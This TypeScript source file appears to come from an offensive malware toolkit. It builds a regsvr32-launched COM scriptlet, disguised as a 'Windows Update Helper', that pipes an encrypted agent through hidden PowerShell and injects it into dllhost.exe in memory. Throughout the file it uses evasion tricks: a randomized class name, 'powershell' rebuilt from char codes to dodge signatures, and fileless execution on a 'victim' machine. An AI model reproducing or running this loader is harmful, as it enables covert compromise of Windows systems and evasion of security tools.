/**
 * sct-wrapper.ts — Wraps a compiled PE binary in a COM scriptlet (.sct)
 * that injects the agent into dllhost.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * LOLBAS delivery: regsvr32.exe (T1218.010) — signed MS binary.
 * Execution: regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
 *
 * Execution chain on victim:
 *   1. regsvr32.exe loads scrobj.dll and parses the .sct XML
 *   2. JScript uses WScript.Shell.Exec to pipe PS script via stdin
 *   3. PowerShell decrypts XOR+gzip payload from piped base64 in memory
 *   4. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   5. dllhost.exe started hidden (LOTL — COM Surrogate, always present, low suspicion)
 *   6. PE manually mapped into dllhost via VirtualAllocEx + WriteProcessMemory
 *   7. Relocations + imports resolved remotely
 *   8. CreateRemoteThread at PE entry point
 *   9. Agent runs inside dllhost.exe — no files on disk
 */

import { v4 as uuidv4 } from "uuid";
import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Generate a self-contained .sct file with fileless PE injection.
 * Uses stdin piping to avoid the 32K Windows environment variable limit.
 * Returns the full SCT content as a string.
 */
export function wrapPeAsSct(peBytes: Buffer): string {
  const encrypted = encryptPayload(peBytes);
  const b64Payload = encrypted.toString("base64");
  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);
  const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

  // Build PS injection chain
  const chain = buildPsInjectionChain("$d", "$cs", className, "dllhost.exe");

  // Escape chain for JScript double-quoted strings: \ → \\, " → \"
  const chainJs = chain.replace(/\\/g, "\\\\").replace(/"/g, '\\"');

  // Split base64 into chunks for multiple JScript StdIn.Write calls
  const chunkSize = 4000;
  const payloadChunks = b64Payload.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [b64Payload];
  const csChunks = csB64.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [csB64];

  // Prefix with letter to ensure valid JScript identifiers
  const rnd = "v" + randHex(5);
  const classId = uuidv4();
  const progId = `Xp.${randClassName(6)}`;

  // JScript payload — pipes full PS script via stdin (no env var size limits)
  const jsLines: string[] = [];
  jsLines.push(`var ${rnd}s=new ActiveXObject("WScript.Shell");`);

  // Reassemble "powershell" from char codes to avoid static signatures
  jsLines.push(`var ${rnd}p=String.fromCharCode(112,111,119,101,114,115,104,101,108,108);`);

  // Exec gives us StdIn access; "-" tells PS to read from stdin
  jsLines.push(`var ${rnd}x=${rnd}s.Exec(${rnd}p+" -nop -w h -ep b -");`);

  // Pipe PS script to stdin in chunks — payload decode
  jsLines.push(`${rnd}x.StdIn.Write("$d=[Convert]::FromBase64String('");`);
  for (const chunk of payloadChunks) {
    jsLines.push(`${rnd}x.StdIn.Write("${chunk}");`);
  }
  jsLines.push(`${rnd}x.StdIn.Write("');");`);

  // Pipe C# source decode
  jsLines.push(`${rnd}x.StdIn.Write("$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('");`);
  for (const chunk of csChunks) {
    jsLines.push(`${rnd}x.StdIn.Write("${chunk}");`);
  }
  jsLines.push(`${rnd}x.StdIn.Write("'));");`);

  // Pipe injection chain (backslashes and quotes escaped for JScript)
  jsLines.push(`${rnd}x.StdIn.Write("${chainJs}");`);
  jsLines.push(`${rnd}x.StdIn.Close();`);

  const jsScript = jsLines.join("\n");

  return `<?XML version="1.0"?>
<scriptlet>
<registration
  description="Windows Update Helper"
  progid="${progId}"
  version="1.00"
  classid="{${classId}}"
>
</registration>
<public>
  <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[
${jsScript}
]]>
</script>
</scriptlet>
`;
}
